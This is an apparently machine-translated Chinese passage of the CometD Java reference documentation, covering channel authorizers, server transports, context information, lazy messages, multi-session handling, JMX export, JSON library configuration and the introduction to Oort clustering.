授权人是实施org.cometd.bayeux.server.Authorizer的对象; 您可以通过以下方式在设置时将其添加到服务器端通道（在该通道上进行任何操作之前）：

	BayeuxServer bayeuxServer = ...;
	bayeuxServer.createChannelIfAbsent("/my/channel", new ConfigurableServerChannel.Initializer() {
	    public void configureChannel(ConfigurableServerChannel channel) {
	        channel.addAuthorizer(GrantAuthorizer.GRANT_PUBLISH);
	    }
	});

实用程序类org.cometd.server.authorizer.GrantAuthorizer提供了一些预先创建的授权人，但您可以自行创建。

授权人特别适用于控制CometD在运行时创建的那些通道的授权，或者对于CometD在运行时通过串联在应用程序启动时未知的字符串（参见下面的示例）构建的那些通道的授权。


- 授权人不适用于元频道，仅适用于服务频道和广播频道。


- 您可以将授权人添加到通配符频道（如/ chat / *）; 它们将影响与您添加了授权者的通配符通道相匹配的所有通道。


- 您添加到/ **的授权人会影响所有非元渠道。

- 对于非通配符频道（如/ chat / room / 10），授权人集合是该频道上的所有授权人以及与频道匹配的通配符频道上的所有授权人的联合体（本例中为频道上的授权人/ chat / room / *，/ chat / room / **，/ chat / **和/ **）。

####9.3.6.2。 授权算法

授权人与当前安装的org.cometd.bayeux.server.SecurityPolicy协作控制对渠道的访问。

org.cometd.bayeux.server.SecurityPolicy类公开了三种可用来控制对频道访问的方法：

	public boolean canCreate   (BayeuxServer server, ServerSession session, String channelId,      ServerMessage message);
	public boolean canSubscribe(BayeuxServer server, ServerSession session, ServerChannel channel, ServerMessage message);
	public boolean canPublish  (BayeuxServer server, ServerSession session, ServerChannel channel, ServerMessage message);


这些授权人分别控制创建频道的操作，订阅频道的操作以及发布到频道的操作。

完整的授权算法如下：


- 如果存在安全策略，并且安全策略拒绝该请求，则该请求被拒绝。


- 否则，如果授权人设置为空，则该请求被授予。


- 否则，如果授权人没有明确授予该操作，则拒绝该请求。


- 否则，如果至少有一个授权者明确授予该操作，并且没有授权者明确拒绝该操作，则该请求被授予。


- 否则，如果一个授权人明确拒绝该操作，则不会咨询剩余的授权人，并且该请求被拒绝。

授权人被调用的顺序并不重要。

org.cometd.bayeux.server.Authorizer的以下方法必须使用您的授权算法来实现：

	public Result authorize(Operation operation, ChannelId channel, ServerSession session, ServerMessage message);

必须返回三种可能的结果之一：


- Result.grant():
 	
		public Result authorize(Operation operation, ChannelId channel, ServerSession session, ServerMessage message) {
    		return Result.grant();
		}

Result.grant（）明确授予执行作为通道参数传入的操作的权限。 至少有一个授权人必须授予该操作，否则该操作将被拒绝。

一个（或多个）授权人授予操作的事实并不意味着该操作在授权算法结束时被授予：它可能被该频道授权人组中的另一个授权人拒绝。

- Result.ignore():

		public Result authorize(Operation operation, ChannelId channel, ServerSession session, ServerMessage message) {
    		return Result.ignore();
		}

Result.ignore（）既不会授予也不会拒绝执行作为通道参数传入的操作的权限。 如果授予操作的条件不适用，则忽略授权请求是拒绝授权的常用方法。

- Result.deny():

		public Result authorize(Operation operation, ChannelId channel, ServerSession session, ServerMessage message) {
		    return Result.deny("reason to deny");
		}

Result.deny（）显式拒绝执行作为通道参数传入的操作的权限。立即拒绝授权请求会导致授权被拒绝，甚至无需咨询授权人为该频道设置的其他授权人。

通常情况下，拒绝授权人被用于交叉担忧：授权人有一个复杂的逻辑，根据用户的合同为特定付费电视频道授予用户访问权限（想象一下，青铜，银牌和黄金合同可以访问不同的电视频道），如果用户的余额不足，无论合约或电视频道被请求，您都有一个授权人拒绝该操作。

与SecurityPolicy（另请参阅授权部分）类似，对任何ServerSession调用Authorizer方法，即使是由本地客户端（如服务，也参见继承的服务部分）生成的方法。实施者应检查正在执行操作的ServerSession是否与本地客户端或远程客户端相关，并采取相应措施（请参阅下面的示例）。

####9.3.6.3. 例子

以下示例假定安全策略不会干扰授权人，并且在通道存在之前（在应用程序启动时或在应用程序逻辑确保尚未创建通道的位置）执行代码。

设想一个应用程序，可以让你观看和玩游戏。

通常，在根通道上添加一个忽略的授权程序：
	
	BayeuxServer bayeuxServer = ...;
	MarkedReference<ServerChannel> ref = bayeuxServer.createChannelIfAbsent("/game/**");
	ServerChannel gameStarStar = ref.getReference();
	gameStarStar.addAuthorizer(GrantAuthorizer.GRANT_NONE);

这确保授权人集不为空，并且默认情况下（如果没有其他授权人授予或拒绝）授权被忽略并因此被拒绝。

只有队长可以开始一场新的比赛，为此他们会为该比赛创建一个新的频道，例如/ game / 123（其中123是gameId）：

	gameStarStar.addAuthorizer(new Authorizer() {
	    public Result authorize(Operation operation, ChannelId channel, ServerSession session, ServerMessage message) {
	        // Always grant authorization to local clients
	        if (session.isLocalSession()) {
	            return Result.grant();
	        }
	
	        boolean isCaptain = isCaptain(session);
	        boolean isGameChannel = !channel.isWild() && new ChannelId("/game").isParentOf(channel);
	        if (operation == Operation.CREATE && isCaptain && isGameChannel) {
	            return Result.grant();
	        }
	        return Result.ignore();
	    }
	});

每个人都可以看比赛：

	gameStarStar.addAuthorizer(GrantAuthorizer.GRANT_SUBSCRIBE);

只有玩家可以玩：
	
	ServerChannel gameChannel = bayeuxServer.getChannel("/game/" + gameId);
	gameChannel.addAuthorizer(new Authorizer() {
	    public Result authorize(Operation operation, ChannelId channel, ServerSession session, ServerMessage message) {
	        // Always grant authorization to local clients
	        if (session.isLocalSession()) {
	            return Result.grant();
	        }
	
	        boolean isPlayer = isPlayer(session, channel);
	        if (operation == Operation.PUBLISH && isPlayer) {
	            return Result.grant();
	        }
	        return Result.ignore();
	    }
	});

授权人员如下：

	/game/**  --> one authorizer that ignores everything
	          --> one authorizer that grants captains authority to create games
	          --> one authorizer that grants everyone the ability to watch games
	/game/123 --> one authorizer that grants players the ability to play

想象一下，以后你想禁止犯罪分子观看比赛，所以你可以添加另一个授权者（而不是修改允许每个人观看比赛的授权者）：

	gameStarStar.addAuthorizer(new Authorizer() {
	    public Result authorize(Operation operation, ChannelId channel, ServerSession session, ServerMessage message) {
	        // Always grant authorization to local clients
	        if (session.isLocalSession()) {
	            return Result.grant();
	        }
	
	        boolean isCriminalSupporter = isCriminalSupporter(session);
	        if (operation == Operation.SUBSCRIBE && isCriminalSupporter) {
	            return Result.deny("criminal_supporter");
	        }
	        return Result.ignore();
	    }
	});

授权人现在是以下人员：
	
	/game/**  --> one authorizer that ignores everything
	          --> one authorizer that grants captains the ability to create games
	          --> one authorizer that grants everyone the ability to watch games
	          --> one authorizer that denies criminal supporters the ability to watch games
	/game/123 --> one authorizer that grants players the ability to play

请注意，/ game / **上的授权者永远不会授予Operation.PUBLISH，授权人只授予特定游戏频道。 此外，特定游戏频道不需要授予Operation.SUBSCRIBE，因为其授权人忽略授权人因此在/ game / **频道上处理的订阅操作。

###9.3.7. 服务器传输
Bayeux协议定义了两个强制传输：长轮询和回调轮询。 这两个传输在BayeuxServer实例中自动配置，并且不需要在配置中明确指定它们。 相应的实现类名为org.cometd.server.transport.JSONTransport和org.cometd.server.transport.JSONPTransport。

对于websocket传输，存在两种传输实现：



- 一个基于JSR 356提供的标准Java API。如果这些API可用，CometD将使用基于标准WebSocket API的websocket传输，其实现类名为org.cometd.websocket.server.WebSocketTransport



- 一个基于Jetty WebSocket API，其实现类名为org.cometd.websocket.server.JettyWebSocketTransport。 CometD不会尝试自动使用此传输。 希望利用此传输提供的额外功能的应用程序必须使用服务器配置部分中所述的传输参数对其进行显式配置（通常与诸如长轮询之类的HTTP传输一起）。

服务器传输的优先顺序是：[websocket，long-polling，callback-polling]。

>注意
>>CometD项目借用了Jetty项目中的许多库，但它们都可以通过Servlet容器移植，因此您可以将CometD Web应用程序部署到任何Servlet容器。

>注意
>>只有当您的Servlet容器支持JSR 356并且如果启用了支持（某些容器可以使其可选），websocket服务器传输才会启用。

>>可以在服务器上使用websocket客户端传输（例如与另一个WebSocket CometD服务器进行通信），因为它完全可移植（假设您将所有依赖关系发布到Web应用程序中）。 例如，可以让客户端通过HTTP与Tomcat中运行的CometD Web应用程序进行通信，该应用程序通过WebSocket与运行在Jetty中的另一个CometD Web应用程序进行通信。

CometD服务器尝试在启动时通过反射来查找JSR 356 API; 如果它们可用，那么它会创建基于JSR 356 API的websocket传输。

>注意
>>请记住，JSR 356 API的可用性还不够，您需要确保您的Web应用程序包含所需的CometD依赖项。


JSR 356 websocket传输需要依赖org.cometd.java:cometd-java-websocket-javax-server（和传递依赖）。

Jetty websocket传输需要依赖关系org.cometd.java:cometd-java-websocket-jetty-server（和传递依赖关系）。

如果您使用Maven，在您的Web应用程序中包含正确的依赖关系非常简单：只需在Web应用程序的pom.xml文件中声明上述依赖关系即可。

如果您不使用Maven，则需要确保上述依赖关系及其传递依赖关系存在于Web应用程序.war文件的WEB-INF / lib目录中。

如果您已将Web应用程序配置为支持跨域HTTP调用（另请参阅本节），则无需担心，因为对于WebSocket协议，CrossOriginFilter默认处于禁用状态。

如果您计划在Web应用程序中使用websocket客户端传输，并且您未使用Maven，请务必阅读Java客户端传输部分。

###9.3.8. 上下文信息

服务器端组件（如服务部分），扩展（请参阅扩展部分）或授权人（另请参阅授权人部分）可能需要访问上下文信息，即Servlet环境提供的信息，例如请求 属性，HTTP会话属性，servlet上下文属性或网络地址信息。

尽管Servlet模型可以轻松提供这些信息，但CometD也可以使用非HTTP传输，如WebSocket，可能没有这些信息。 CometD通过org.cometd.bayeux.server.BayeuxContext类抽象检索任何传输的上下文信息。

BayeuxContext的一个实例可以从BayeuxServer实例中获得：

	BayeuxContext context = bayeuxServer.getContext();

SecurityPolicy中的典型用法（另请参阅授权部分）如下：

	public class OneClientPerAddressSecurityPolicy extends DefaultSecurityPolicy {
	    private final Set<String> addresses = new HashSet<String>();
	
	    @Override
	    public boolean canHandshake(BayeuxServer bayeuxServer, ServerSession session, ServerMessage message) {
	        BayeuxContext context = bayeuxServer.getContext();
	
	        // Get the remote address of the client
	        final String remoteAddress = context.getRemoteAddress().getHostString();
	
	        // Only allow clients from different remote addresses
	
	        boolean notPresent = addresses.add(remoteAddress);
	
	        // Avoid to leak addresses
	        session.addListener(new ServerSession.RemoveListener() {
	            public void removed(ServerSession session, boolean timeout) {
	                addresses.remove(remoteAddress);
	            }
	        });
	
	        return notPresent ? true : false;
	    }
	}

有关BayeuxContext中可用方法的更多信息，请参阅Javadoc文档。

建议始终调用BayeuxServer.getContext（）以获取BayeuxContext实例; 它不应该被缓存，然后在消息中重用。 这样可以在您使用WebSocket和HTTP传输混合的情况下实现代码的最大可移植性。

####9.3.8.1.HTTP上下文信息

对于诸如long-polling和callback-polling等纯HTTP传输，BayeuxContext中包含的信息与携带Bayeux消息的当前HTTP请求之间存在直接关联。

对于这些传输，每次调用BayeuxServer.getContext（）时都会重新创建BayeuxContext，从而包装当前的HttpServletRequest。

####9.3.8.2. WebSocket上下文信息

对于WebSocket传输，在从HTTP到WebSocket的升级过程中，仅创建一次BayeuxContext实例。包含在HTTP升级请求中的信息被复制到BayeuxContext实例中，并且从未再次更新，因为在升级之后协议是WebSocket，并且此类上下文信息不再可用。

###9.3.9.懒惰的频道和消息
有时应用程序需要向客户端发送非紧急消息;例如“收到邮件”或“服务器正常运行时间”等警告消息就是典型的例子，但聊天消息有时也适用于此定义。虽然这些消息最终需要到达客户端，但不需要立即交付它们：它们排队到ServerSession的消息队列中，但它们的交付可以推迟到第一次。

在CometD中，“第一次”意味着首先发生以下任何事情（有关配置以下参数的信息，另请参阅服务器配置部分）：



- 频道的延迟超时到期



- / meta / connect超时将过期，以便将/ meta / connect响应发送到客户端



- 另一个非惰性消息触发`ServerSession的消息队列发送到客户端

为了支持这个功能，CometD引入了懒惰通道和懒惰消息的概念。

应用程序可以通过在消息实例本身上调用ServerMessage.Mutable.setLazy（true）将消息标记为懒惰，例如：

	@Service
	public class LazyService {
	    @Inject
	    private BayeuxServer bayeuxServer;
	    @Session
	    private LocalSession session;
	
	    public void receiveNewsFromExternalSystem(NewsInfo news) {
	        ServerMessage.Mutable message = this.bayeuxServer.newMessage();
	        message.setChannel("/news");
	        message.setData(news);
	        message.setLazy(true);
	        this.bayeuxServer.getChannel("/news").publish(this.session, message);
	    }
	}

在这个例子中，每当有新闻时，外部系统调用方法LazyService.receiveNewsFromExternalSystem（...），并且该服务向所有感兴趣的客户端广播该消息。但是，由于消息不需要立即传递，消息被标记为懒惰。每个远程客户端可能在不同的时间收到消息：有些消息会立即收到（因为，例如，他们有其他非惰性消息要发送），有些会在几毫秒后收到（因为，例如，他们的/ meta /连接超时在几毫秒内到期），而其他人只在整个maxLazyInterval超时时间内接收到它。

以同样的方式，您可以将消息标记为懒惰，也可以将服务器通道标记为懒惰。发布到懒惰通道的每条消息都会变成一条懒惰消息，然后排队等待到ServerSession的消息队列中以便第一次传递。

您可以随时将服务器通道标记为懒惰，但最好在创建时将其配置为懒惰，例如：

	@Service
	public class LazyService {
	    @Inject
	    private BayeuxServer bayeuxServer;
	    @Session
	    private LocalSession session;
	
	    @Configure("/news")
	    public void setupNewsChannel(ConfigurableServerChannel channel) {
	        channel.setLazy(true);
	    }
	
	    public void receiveNewsFromExternalSystem(NewsInfo news) {
	        this.bayeuxServer.getChannel("/news").publish(this.session, news);
	    }
	}

当服务器通道被标记为lazy时，默认情况下它具有由全局maxLazyTimeout参数指定的延迟超时（另请参阅服务器配置部分）。

在更复杂的情况下，您可能希望为不同的服务器通道指定不同的延迟超时，例如：

	@Service
	public class LazyService {
	    ...
	
	    @Configure("/news")
	    public void setupNewsChannel(ConfigurableServerChannel channel) {
	        channel.setLazy(true);
	    }
	
	    @Configure("/chat")
	    public void setupChatChannel(ConfigurableServerChannel channel) {
	        channel.setLazyTimeout(2000);
	    }
	
	    ...
	}

在上面的例子中，频道/新闻继承了默认的maxLazyTimeout（5000毫秒），而/ chat频道配置了特定的延迟超时2000毫秒。 具有非零正向延迟超时的服务器通道会自动标记为“惰性”。

如果通配符服务器通道（如/ chat / *）被标记为“惰性”，则发送到与该通配符服务器通道匹配的服务器通道（如/ chat / 1）的所有消息都将是懒惰的。 相反，如果非通配符服务器频道（例如/ news）是懒惰的，则发送到该非通配符服务器频道（例如/ news / sport）的子服务器频道的所有消息都不会是懒惰的。

###9.3.10.多个会话
###9.3.11.多个与HTTP / 1.1的会话
在HTTP / 1.1协议中，浏览器等客户端为每个域打开有限数量的连接，通常为6个。

RFC 2616建议客户端每个域打开不超过两个连接。 RFC 7230中已删除此限制，但打开太多连接到域名仍不是一个好主意。

因此，对HTTP / 1.1协议实施限制的浏览器等客户端也会限制它们可以向服务器发出的并发未完成请求的数量。

在浏览器中，指向同一个域的所有选项卡将共享此每个域的连接池。如果用户打开6个浏览器标签到同一个CometD应用程序（因此也是同一个域），那么6个长轮询请求将被发送到服务器，因此会消耗所有可用的连接。这意味着，与服务器的任何进一步通信（例如，发布消息，以及任何其他交互，无论是通过单击链接还是使用XMLHttpRequest）都将排队，并且将等待其中一个长轮询返回抓住机会发送到服务器。

这对用户体验不利。用户与应用程序的交互应该产生一些即时反馈，但交互会排队几秒钟，使用户怀疑与用户界面的交互确实发生，从而导致应用程序的使用受挫。

CometD Server实现了多客户端的建议（另见本节）。服务器使用BAYEUX_BROWSER cookie从同一浏览器检测多个CometD会话。

当CometD服务器检测到多个会话时，它使用参数maxSessionsPerBrowser（默认设置为1）来决定该客户端在使用HTTP / 1.1协议时允许多少个会话（或者相当于多长时间轮询）（请参阅也是服务器配置部分）。额外的长期轮询请求将被服务器立即返回，通知对象的多客户端字段设置为true。 maxSessionsPerBrowser的负值允许不限数量的长民意调查。

通知对象还包含一个设置为multiSessionInterval参数值的间隔字段（另请参阅服务器配置部分）。这指示客户端在该时间间隔过去之前不要发送另一个轮询。此建议的效果是，额外的客户端会话将使用multiSessionInterval时段对服务器执行正常民意调查（不是长时间民意调查）。这样可以避免消耗所有HTTP连接，但需要花费额外选项卡的延迟时间。

建议客户端应用程序监视通知对象中多个客户端的/ meta / connect通道字段。如果检测到，应用程序可能会要求用户关闭其他选项卡，或者可以自动关闭它们，或采取其他一些操作。

非浏览器客户端应该使用相同的浏览器语义来处理BAYEUX_BROWSER cookie：存储cookie并将它们随后的请求一起发送到相应的域。这确保了两件事：服务器可以识别有效会话（请参阅安全部分），并确保服务器可以检测来自同一客户端的多个会话。

###9.3.12.多个会话与HTTP / 2
HTTP / 2协议为每个域使用单个连接，并且可以在此单个连接内复用大量并发请求。这具有消除客户端可以对服务器发出的并发，未完成请求的限制的效果，允许服务器支持客户端所需的多个长轮询请求。

参数http2MaxSessionsPerBrowser（默认设置为-1）控制客户端在使用HTTP / 2协议时允许的会话数量（或等同于多少次长轮询）（另请参阅服务器配置部分）。

http2MaxSessionsPerBrowser的负值允许不限数量的会话;正值会限制每个客户端允许的最大会话数。

###9.3.13.JMX集成
服务器端CometD组件可以作为JMX MBeans公开，并通过诸如Java Mission Control，JVisualVM或JConsole等监视工具显示。

CometD MBeans基于Jetty的JMX支持，可通过Servlet容器移植。

####9.3.13.1.Jetty中的JMX集成

如果您的CometD应用程序部署在Jetty中，那么通过添加Jetty特定的上下文参数来修改web.xml就足够了：
	
	<?xml version="1.0" encoding="ISO-8859-1"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
	         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
	         version="3.0">
	
	    <context-param>
	        <param-name>org.eclipse.jetty.server.context.ManagedAttributes</param-name>
	        <param-value>org.cometd.bayeux,org.cometd.oort.Oort</param-value>
	    </context-param>
	
	    <!-- The rest of your web.xml -->
	</webapp>

org.eclipse.jetty.server.context.ManagedAttributes上下文参数的值是存储在servlet上下文中的以逗号分隔的属性名称列表。 CometD实现将BayeuxServer实例存储在servlet上下文中由常量BayeuxServer.ATTRIBUTE定义的名称下，该名称的确是字符串org.cometd.bayeux，您可以在上面的示例中找到该字符串作为上下文参数的值。

同样，CometD实现将Oort实例和Seti实例分别存储在servlet上下文中定义的名称下 - 分别由常量Oort.OORT_ATTRIBUTE和Seti.SETI_ATTRIBUTE定义，等同于字符串org.cometd.oort.Oort和org.cometd。 oort.Seti分别。

或者，请记住，注释的服务实例（另请参阅注释的服务部分）存储在servlet上下文中，因此，如果您定义了正确的Jetty JMX MBean元数据描述符，则可以使用相同的机制作为MBeans公开。

在Jetty中运行时，您只需要执行导出CometD MBean。

####9.3.13.2.其他Servlet容器中的JMX集成

即使您的应用程序部署在其他Servlet容器中，上面配置的上下文参数也可以留在web.xml中，因为它只会被Jetty检测到。

为了在其他Servlet容器中利用Jetty的JMX支持，您需要Jetty JMX实用程序类，并且需要导出CometD MBean。

为了让Jetty JMX实用程序类可用于Web应用程序，您需要在您的Web应用程序的WEB-INF / lib目录中包含jetty-jmx- <version> .jar。该jar包含Jetty的JMX实用程序类，可用于轻松创建CometD MBean。

在其他Servlet容器中导出CometD MBeans需要比Jetty中所需的设置稍多一些，但可以使用小型初始化器类轻松完成。有关如何初始化CometD组件的更广泛讨论，请参阅服务集成部分。

这种初始化类的一个简单例子如下：

import java.io.IOException;
import java.lang.management.ManagementFactory;
import javax.servlet.GenericServlet;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import org.cometd.bayeux.server.BayeuxServer;
import org.eclipse.jetty.jmx.MBeanContainer;

	public class CometDJMXExporter extends GenericServlet {
	    private volatile MBeanContainer mbeanContainer;
	
	    @Override
	    public void init() throws ServletException {
	        try {
	            mbeanContainer = new MBeanContainer(ManagementFactory.getPlatformMBeanServer());
	            BayeuxServer bayeuxServer = (BayeuxServer)getServletContext().getAttribute(BayeuxServer.ATTRIBUTE);
	            mbeanContainer.addBean(bayeuxServer);
	            // Add other components
	            mbeanContainer.start();
	        } catch (Exception x) {
	            throw new ServletException(x);
	        }
	    }
	
	    @Override
	    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
	        throw new ServletException();
	    }
	
	    @Override
	    public void destroy() {
	        try {
	            mbeanContainer.stop();
	        } catch (Exception ignored) {
	        }
	    }
	}

与相应的web.xml配置：

	<?xml version="1.0" encoding="ISO-8859-1"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
	         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
	         version="3.0">
	
	    <!-- The rest of your web.xml -->
	
	    <servlet>
	        <servlet-name>jmx-exporter</servlet-name>
	        <servlet-class>com.acme.cometd.CometDJMXExporter</servlet-class>
	        <!-- Make sure it's the last started -->
	        <load-on-startup>2</load-on-startup>
	    </servlet>
	
	</webapp>

在这个例子中，CometDJMXExporter是一个配置Servlet（因此它没有被映射到任何路径），它实例化了Jetty的JMX实用工具类MBeanContainer，从Servlet上下文中提取了您想要作为MBeans公开的CometD组件，并将它们添加到 MBeanContainer实例。 它以编程的方式执行Jetty在检测到web.xml中的org.eclipse.jetty.server.context.ManagedAttributes上下文参数时为您做了什么。

9.4. JSON 库
------------


CometD允许您自定义JSON库，该库用于将传入的JSON转换为Bayeux消息并从Bayeux消息生成JSON。

有两个实现可用，一个基于Jetty的org.eclipse.jetty.util.ajax.JSON类，另一个基于Jackson库。 默认实现使用Jetty库。 他们之间的区别包括：



- Jetty库允许您插入自定义序列化器和反序列化器，通过自定义API精确控制从对象到JSON的转换，反之亦然。 有关更多信息，请参阅org.eclipse.jetty.util.ajax.JSON javadocs。



- jackson库提供了一个基于批注的丰富API来自定义JSON生成，但更少的是自定义JSON解析并获取自定义类的对象。 有关更多详细信息，请参阅Jackson文档。


###9.4.1. JSONContext API

CometD Java客户端实现（另见客户端部分）使用JSON库来生成JSON并将JSON解析为org.cometd.bayeux.Message实例。 在客户端上执行此生成/解析的JSON库类必须实现org.cometd.common.JSONContext.Client。

同样，在服务器上，org.cometd.common.JSONContext.Server实现将生成JSON并将JSON解析为org.cometd.bayeux.server.ServerMessage实例。

####9.4.1.1. 客户端配置

在客户端上，org.cometd.common.JSONContext.Client实例必须直接传递到传输配置; 如果省略，则使用默认的Jetty JSON库。 例如：

	HttpClient httpClient = ...;
	
	Map<String, Object> transportOptions = new HashMap<String, Object>();
	
	// Use the Jackson implementation
	JSONContext.Client jsonContext = new JacksonJSONContextClient();
	transportOptions.put(ClientTransport.JSON_CONTEXT, jsonContext);
	
	ClientTransport transport = new LongPollingTransport(transportOptions, httpClient);
	
	BayeuxClient client = new BayeuxClient(cometdURL, transport);

所有客户端传输都可以共享org.cometd.common.JSONContext.Client实例（因为任何时候只使用一个传输）。

JSONContext.Server和JSONContext.Client类还提供了获取JSON解析器（将JSON反序列化为对象）和JSON生成器（从对象生成JSON）的方法，以便应用程序不需要硬编码特定 实现库。

类JSONContext.Parser可用于将应用程序需要读取的任何JSON转换为对象用于其他目的（例如从配置文件中读取），当然也可以转换为自定义对象（另请参阅JSON自定义部分）：


	public EchoInfo readFromConfigFile(BayeuxServer bayeuxServer) throws ParseException {
	    try (FileReader reader = new FileReader("echo.json")) {
	        JSONContext.Server jsonContext = (JSONContext.Server)bayeuxServer.getOption("jsonContext");
	        EchoInfo info = jsonContext.getParser().parse(reader, EchoInfo.class);
	        return info;
	    }
	}

同样，对象可以转换成JSON：

	public EchoInfo writeToConfigFile(BayeuxServer bayeuxServer, EchoInfo info) throws IOException {
	    // JDK 7's try-with-resources
	    try (FileWriter writer = new FileWriter("echo.json")) {
	        JSONContext.Server jsonContext = (JSONContext.Server)bayeuxServer.getOption("jsonContext");
	        String json = jsonContext.getGenerator().generate(info);
	        writer.write(json);
	    }
	}

####9.4.1.2. 服务器配置

在服务器上，您可以指定实现org.cometd.common.JSONContext.Server的类的完全限定名作为CometDServlet的init参数（另请参阅服务器配置部分）; 如果省略，则使用默认的Jetty库。 例如：

	<?xml version="1.0" encoding="UTF-8"?>
	<web-app xmlns="http://java.sun.com/xml/ns/javaee"
	         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	         xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
	         version="3.0">
	
	    <servlet>
	        <servlet-name>cometd</servlet-name>
	        <servlet-class>org.cometd.server.CometDServlet</servlet-class>
	        <!-- other parameters -->
	        <init-param>
	            <param-name>jsonContext</param-name>
	            <param-value>org.cometd.server.JacksonJSONContextServer</param-value>
	        </init-param>
	        <load-on-startup>1</load-on-startup>
	        <async-supported>true</async-supported>
	    </servlet>
	    <servlet-mapping>
	        <servlet-name>cometd</servlet-name>
	        <url-pattern>/cometd/*</url-pattern>
	    </servlet-mapping>
	
	</web-app>

指定的类必须使用默认的无参数构造函数实例化，并且必须实现org.cometd.common.JSONContext.Server。您可以通过添加如上所述的序列化器/反序列化器来对其进行定制。

####9.4.1.3.Oort配置

在Oort集群中（请参阅Oort部分），Oort实例需要同时拥有服务器和客户端`JSONContext`：用于反序列化其他Oort彗星发送的消息的服务器，以及用于序列化消息以发送到其他奥特彗星。

Oort实例将使用已经为服务器配置的JSONContext.Server，如JSON服务器配置部分所述。

Oort实例将使用配置中指定的JSONContext.Client（另请参阅Oort公共配置部分）。

###9.4.2.可移植性注意事项
可以从JSON库的一个实现切换到另一个实现 - 例如从Jetty库到Jackson库，只要您仔细编写应用程序代码即可。

Jackson在反序列化JSON数组时可能会生成java.util.List的实例。但是，Jetty库在反序列化JSON数组时生成java.lang.Object []。

同样，Jackson可能会生成Jetty库生成java.lang.Long的java.lang.Integer。

要编写可移植的应用程序代码，请使用以下代码模式：

	Message message = ...;
	Map<String, Object> data = message.getDataAsMap();
	
	// Expecting a JSON array
	
	// WRONG
	Object[] array = (Object[])data.get("array");
	
	// CORRECT
	Object field = data.get("array");
	Object[] array = field instanceof List ? ((List)field).toArray() : (Object[])field;
	
	
	// Expecting a long
	
	// WRONG
	long value = (Long)data.get("value");
	
	// CORRECT
	long value = ((Number)data.get("value")).longValue();

###9.4.3. 自定义JSON对象的反序列化
有时，在调用message.getData（）时，能够获取应用程序类的对象而不仅仅是Map <String，Object>是非常有用的。

您可以使用Jetty JSON库轻松实现此目的。 客户端格式化JSON对象并添加一个额外的类字段就足够了，该字段的值是要将JSON转换为的完全限定的类名称：

	cometd.publish('/echo', {
	    class: 'org.cometd.example.EchoInfo',
	    id: '42',
	    echo: 'cometd'
	});


在服务器上的web.xml文件中，将org.cometd.server.JettyJSONContextServer注册为jsonContext（另请参阅JSON服务器配置部分），并在启动时为org.cometd.example.EchoInfo添加自定义转换器 类（另请参阅服务集成部分，了解有关在启动时配置CometD的更多详细信息）。

	BayeuxServer bayeuxServer = ...;
	JettyJSONContextServer jsonContext = (JettyJSONContextServer)bayeuxServer.getOption("jsonContext");
	jsonContext.getJSON().addConvertor(EchoInfo.class, new EchoInfoConvertor());

最后，这些是EchoInfoConvertor和EchoInfo类：


	public class EchoInfoConvertor implements JSON.Convertor {
	    public void toJSON(Object obj, JSON.Output out) {
	        EchoInfo echoInfo = (EchoInfo)obj;
	        out.addClass(EchoInfo.class);
	        out.add("id", echoInfo.getId());
	        out.add("echo", echoInfo.getEcho());
	    }
	
	    public Object fromJSON(Map map) {
	        String id = (String)map.get("id");
	        String echo = (String)map.get("echo");
	        return new EchoInfo(id, echo);
	    }
	}
	
	public class EchoInfo {
	    private final String id;
	    private final String echo;
	
	    public EchoInfo(String id, String echo) {
	        this.id = id;
	        this.echo = echo;
	    }
	
	    public String getId() {
	        return id;
	    }
	
	    public String getEcho() {
	        return echo;
	    }
	}


如果不使用JavaScript客户端，而是使用Java客户端，则可以配置Java客户端以相同的方式执行JSON对象的序列化/反序列化（另请参阅JSON客户端配置部分）：

	JettyJSONContextClient jsonContext = ...;
	jsonContext.getJSON().addConvertor(EchoInfo.class, new EchoInfoConvertor());
	
	// Later in the application
	BayeuxClient bayeuxClient = ...;
	
	bayeuxClient.getChannel("/echo").subscribe(new ClientSessionChannel.MessageListener() {
	    public void onMessage(ClientSessionChannel channel, Message message) {
	        // Receive directly EchoInfo objects
	        EchoInfo data = (EchoInfo)message.getData();
	    }
	});
	
	// Publish directly EchoInfo objects
	bayeuxClient.getChannel("/echo").publish(new EchoInfo("42", "wohoo"));

9.5.使用Oort进行可伸缩性聚类
--------------------------
CometD发布了一个名为Oort的集群解决方案，该解决方案增强了基于CometD系统的可扩展性。客户端连接到多个节点，而不是连接到单个节点（通常由虚拟或物理主机代表），以便应付负载所需的处理能力分散在多个节点中，从而使整个系统的可扩展性高于使用单个节点节点。

Oort群集不是高可用性群集解决方案：如果其中一个节点崩溃，则与其连接的所有客户端都将断开连接并重新连接到其他节点（通过新的握手）。一台客户端与服务器构建的所有信息（例如，一个在线国际象棋游戏的状态）一般都会丢失（除非应用程序已经采用其他方式来检索该信息）。

###9.5.1.基础设施
建立Oort群集的典型但不是唯一的基础架构是在Oort节点前面有一个负载均衡器，这样客户端就可以透明地连接到任何节点。负载平衡器应该实现粘性，它可以基于：



- 远程IP地址（推荐）



- CometD的BAYEUX_BROWSER cookie（请参阅多客户端部分），它只适用于HTTP传输



- 负载均衡器支持的其他一些机制。

您应该使用单个主机名/ IP地址对（负载均衡器的）配置DNS，以便在节点崩溃的情况下，当客户端尝试重新连接到相同的主机名时，负载平衡器会注意到该节点已崩溃并将连接指向另一个节点。第二个节点不知道这个客户端，并在收到连接请求时向客户端发送建议以进行握手。


![](https://i.imgur.com/YSL9oqP.png)



###9.5.2.术语
接下来的部分使用以下术语：



- Oort群集也被称为Oort云;因此云是群集的同义词



- 奥特节点也被称为奥特彗星;因此彗星是节点的同义词

###9.5.3. Oort群集
